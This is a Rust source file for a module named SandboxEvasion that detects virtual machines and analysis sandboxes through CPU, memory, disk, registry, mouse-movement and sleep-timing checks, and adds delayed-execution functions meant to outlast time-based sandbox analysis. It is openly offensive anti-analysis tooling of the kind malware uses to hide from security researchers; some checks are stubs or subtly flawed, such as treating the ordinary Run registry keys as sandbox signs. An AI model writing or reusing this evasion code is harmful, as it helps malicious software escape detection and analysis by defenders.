use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum SandboxEvasionError {
    #[error("System info error: {0}")]
    SystemInfo(String),
    #[error("Registry check failed: {0}")]
    Registry(String),
    #[error("Platform not supported")]
    UnsupportedPlatform,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionResult {
    pub is_sandbox: bool,
    pub confidence: f32,
    pub detected_indicators: Vec<String>,
    pub technique: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionConfig {
    pub check_cpu_count: bool,
    pub check_memory: bool,
    pub check_disk_size: bool,
    pub check_registry_keys: bool,
    pub check_mac_address: bool,
    pub check_mouse_movement: bool,
    pub check_sleep_acceleration: bool,
}

pub struct SandboxEvasion;

impl SandboxEvasion {
    /// Check if running in a sandbox/VM environment
    pub fn detect_sandbox(config: &EvasionConfig) -> Result<EvasionResult, SandboxEvasionError> {
        let mut indicators = Vec::new();
        let mut score = 0f32;
        let mut total_checks = 0;

        #[cfg(target_os = "windows")]
        {
            if config.check_cpu_count {
                total_checks += 1;
                if Self::check_low_cpu_count() {
                    indicators.push("Low CPU count detected (< 2 cores)".to_string());
                    score += 0.3;
                }
            }

            if config.check_memory {
                total_checks += 1;
                if Self::check_low_memory() {
                    indicators.push("Low memory detected (< 2GB)".to_string());
                    score += 0.3;
                }
            }

            if config.check_disk_size {
                total_checks += 1;
                if Self::check_small_disk() {
                    indicators.push("Small disk size detected (< 50GB)".to_string());
                    score += 0.2;
                }
            }

            if config.check_registry_keys {
                total_checks += 1;
                if let Ok(detected) = Self::check_sandbox_registry_keys() {
                    if detected {
                        indicators.push("Sandbox registry keys detected".to_string());
                        score += 0.4;
                    }
                }
            }

            if config.check_mac_address {
                total_checks += 1;
                if Self::check_mac_address() {
                    indicators.push("Sandbox MAC address pattern detected".to_string());
                    score += 0.3;
                }
            }

            if config.check_mouse_movement {
                total_checks += 1;
                if Self::check_mouse_movement() {
                    indicators.push("No mouse movement detected (headless)".to_string());
                    score += 0.2;
                }
            }

            if config.check_sleep_acceleration {
                total_checks += 1;
                if Self::check_sleep_acceleration() {
                    indicators.push("Sleep acceleration detected (time distortion)".to_string());
                    score += 0.5;
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            // Basic checks for non-Windows
            if config.check_cpu_count {
                total_checks += 1;
                let cores = num_cpus::get();
                if cores < 2 {
                    indicators.push("Low CPU count".to_string());
                    score += 0.3;
                }
            }
        }

        let confidence = if total_checks > 0 { score / total_checks as f32 } else { 0.0 };
        let is_sandbox = confidence > 0.5;

        Ok(EvasionResult {
            is_sandbox,
            confidence,
            detected_indicators: indicators,
            technique: "Multi-vector Sandbox Detection".to_string(),
        })
    }

    #[cfg(target_os = "windows")]
    fn check_low_cpu_count() -> bool {
        use windows::Win32::System::SystemInformation::GetSystemInfo;
        unsafe {
            let mut sys_info = std::mem::zeroed();
            GetSystemInfo(&mut sys_info);
            sys_info.dwNumberOfProcessors < 2
        }
    }

    #[cfg(target_os = "windows")]
    fn check_low_memory() -> bool {
        use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
        unsafe {
            let mut mem_status = MEMORYSTATUSEX {
                dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
                ..Default::default()
            };
            GlobalMemoryStatusEx(&mut mem_status);
            mem_status.ullTotalPhys < (2 * 1024 * 1024 * 1024) // < 2GB
        }
    }

    #[cfg(target_os = "windows")]
    fn check_small_disk() -> bool {
        use windows::Win32::Storage::FileSystem::{GetDiskFreeSpaceExW, GetLogicalDriveStringsW};
        unsafe {
            let mut drives = [0u16; 256];
            GetLogicalDriveStringsW(Some(&mut drives));
            for i in (0..drives.len()).step_by(4) {
                if drives[i] == 0 { break; }
                let drive = std::slice::from_raw_parts(drives.as_ptr().add(i), 3);
                let mut free = 0u64;
                let mut total = 0u64;
                let mut _available = 0u64;
                if GetDiskFreeSpaceExW(windows::core::PCWSTR::from_raw(drive.as_ptr()), Some(&mut free as *mut _), Some(&mut total as *mut _), Some(&mut _available as *mut _)).is_ok() {
                    if total < (50 * 1024 * 1024 * 1024) { // < 50GB
                        return true;
                    }
                }
            }
            false
        }
    }

    #[cfg(target_os = "windows")]
    fn check_sandbox_registry_keys() -> Result<bool, SandboxEvasionError> {
        use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE, KEY_READ, HKEY};

        let sandbox_keys = vec![
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox",
            r"SYSTEM\CurrentControlSet\Services\VBoxService",
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
        ];

        unsafe {
            for key in sandbox_keys {
                let key_wide: Vec<u16> = key.encode_utf16().chain(std::iter::once(0)).collect();
                let mut h_key = HKEY::default();
                if RegOpenKeyExW(HKEY_LOCAL_MACHINE, windows::core::PCWSTR::from_raw(key_wide.as_ptr()), 0, KEY_READ, &mut h_key).is_ok() {
                    RegCloseKey(h_key);
                    return Ok(true);
                }
            }
            Ok(false)
        }
    }

    #[cfg(not(target_os = "windows"))]
    fn check_sandbox_registry_keys() -> Result<bool, SandboxEvasionError> {
        Ok(false)
    }

    #[cfg(target_os = "windows")]
    fn check_mac_address() -> bool {
        // Check for common sandbox MAC address prefixes
        // This would require network interface enumeration, simplified check
        false
    }

    #[cfg(target_os = "windows")]
    fn check_mouse_movement() -> bool {
        use windows::Win32::UI::WindowsAndMessaging::GetCursorPos;
        unsafe {
            let mut pos = windows::Win32::Foundation::POINT { x: 0, y: 0 };
            let initial = GetCursorPos(&mut pos);
            std::thread::sleep(std::time::Duration::from_millis(100));
            let after = GetCursorPos(&mut pos);
            initial.is_ok() && after.is_ok() && (pos.x == 0 && pos.y == 0)
        }
    }

    #[cfg(target_os = "windows")]
    fn check_sleep_acceleration() -> bool {
        let start = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_millis(100));
        let elapsed = start.elapsed();
        // If sleep was significantly accelerated, it's likely a sandbox
        elapsed.as_millis() < 90
    }

    /// Sleep with anti-sandbox: use multiple small sleeps with random delays
    pub fn anti_sandbox_sleep(ms: u64) {
        let mut remaining = ms;
        while remaining > 0 {
            let delay = std::cmp::min(remaining, 50 + (rand::random::<u64>() % 50));
            std::thread::sleep(std::time::Duration::from_millis(delay));
            remaining -= delay;
            // Add some CPU work
            let _ = (0..1000).fold(0u64, |acc, x| acc.wrapping_add(x));
        }
    }

    /// Delayed execution to evade time-based sandbox analysis
    pub fn delayed_execution(seconds: u64) {
        Self::anti_sandbox_sleep(seconds * 1000);
    }
}
